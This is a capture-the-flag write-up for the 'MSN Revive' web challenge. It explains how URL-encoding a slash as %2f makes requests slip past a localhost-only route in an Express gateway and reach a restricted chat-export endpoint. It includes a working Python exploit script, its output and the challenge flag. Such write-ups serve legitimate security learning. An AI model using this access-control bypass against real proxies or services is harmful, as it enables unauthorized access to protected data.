# MSN Revive

I've started building my own personal version of MSN. The site is still under development, but you can already start chatting with your friends...

## Writeup

If we take a look inside the `docker-compose.yml` file, we can see that the flag is stored in the `FLAG` environment variable used by the backend:

```yml
backend:
    build: ./backend
    container_name: backend
    environment:
      - APP_SECRET=REDACTED
      - FLAG=srdnlen{REDACTED}
    networks:
      - internal_net
```

From the `utils.py` script we can see that the flag is written inside a message of the **justlel** user in the chat with `session_id = "00000000-0000-0000-0000-000000000000"`:

```python
Message(
    session_id=session_id,  # type: ignore
    sender_id=user1.id,  # type: ignore
    kind="message",  # type: ignore
    body=f"Perfect, I'll send you the password here. {flag}",  # type: ignore
),
```

To retrieve this message we can use the **/api/export/chat** endpoint:

```python
@api.post("/export/chat")
def chat_export() -> tuple[Response, int] | Response:
    data = request.get_json(force=True, silent=True) or {}
    sid = (data.get("session_id") or "").strip()
    fmt = (data.get("format") or "html").strip().lower()

    if not sid:
        return error(
            "missing_session_id", "MISSING_SESSION_ID", HTTPStatus.BAD_REQUEST
        )

    if fmt not in ("xml", "html"):
        return error("bad_format", "BAD_FORMAT", HTTPStatus.BAD_REQUEST)

    if not ChatSession.query.get(sid):
        return error("unknown_session", "UNKNOWN_SESSION", HTTPStatus.NOT_FOUND)

    # NOTE: This endpoint is a temporary WIP used for validating the export
    # rendering logic.

    return success({"data": render_export(sid, fmt)})
```

However, looking inside `gateway.js`, we can see that this endpoint is restricted to localhost only:

```js
app.all("/api/export/chat", (req, res, next) => {
  if (!isLocalhost(req)) {
    return res.status(403).json({ ok: false, error: "WIP: local access only" });
  }
  next();
});
```

We can also see that all other requests are handled by a catch-all proxy route:

```js
app.use((req, res) => {
  proxyRequest(req, res);
});
```

The Express route `/api/export/chat` matches the **decoded** path, but if we URL-encode the `/` between `export` and `chat` as `%2f`, Express won't match it against the restricted route. The request will instead fall through to the catch-all proxy, which forwards it to the backend. The backend then decodes `%2f` back to `/`, treating it as a normal `/api/export/chat` request.

The bypassed path looks like this:

```
/api/export%2fchat
```

The exploit script:

```python
#!/usr/bin/python3
import requests

ip = 'localhost'
port = 8000

ip = 'msnrevive.challs.srdnlen.it'
port = 80

url = f"http://{ip}:{port}"

def getFlag(s):
    data = {
        'session_id': '00000000-0000-0000-0000-000000000000',
        'format': 'html'
    }

    req = s.post(url + '/api/export%2fchat', json=data)
    return req.content
    
if __name__ == '__main__':
    s = requests.Session()

    print(getFlag(s))
```

If we run the exploit against the CTF server, we get the following output:

```bash
b'{"data":{"data":"<!doctype html>\\n<html>\\n<head>\\n  <meta charset=\\"utf-8\\"/>\\n  <title>MSN Chat Export</title>\\n</head>\\n<body>\\n  <h1>Chat Export</h1>\\n  <p><b>session_id</b>: 00000000-0000-0000-0000-000000000000</p>\\n  <p><b>generated_at</b>: 2026-03-01T13:27:37.511478+00:00</p>\\n  <h3>Meta</h3>\\n  <h3>Messages</h3>\\n  <table border=\\"1\\" cellpadding=\\"6\\" cellspacing=\\"0\\">\\n    <tr><th>ts</th><th>kind</th><th>sender_id</th><th>body</th></tr>\\n    <tr><td>2026-03-01T07:22:09.505275</td><td>message</td><td>1</td><td>Hi Chri, I&#x27;ve finished setting up the team&#x27;s infrastructure.</td></tr><tr><td>2026-03-01T07:22:09.505279</td><td>message</td><td>2</td><td>We Lo, thanks! I&#x27;ll take a look at them as soon as I can.</td></tr><tr><td>2026-03-01T07:22:09.505280</td><td>message</td><td>1</td><td>Perfect, I&#x27;ll send you the password here. srdnlen{n0st4lg14_1s_4_vuln3r4b1l1ty_t00}</td></tr>\\n  </table>\\n</body>\\n</html>\\n"},"ok":true}\n'
```

With this flag:

```
srdnlen{n0st4lg14_1s_4_vuln3r4b1l1ty_t00}
```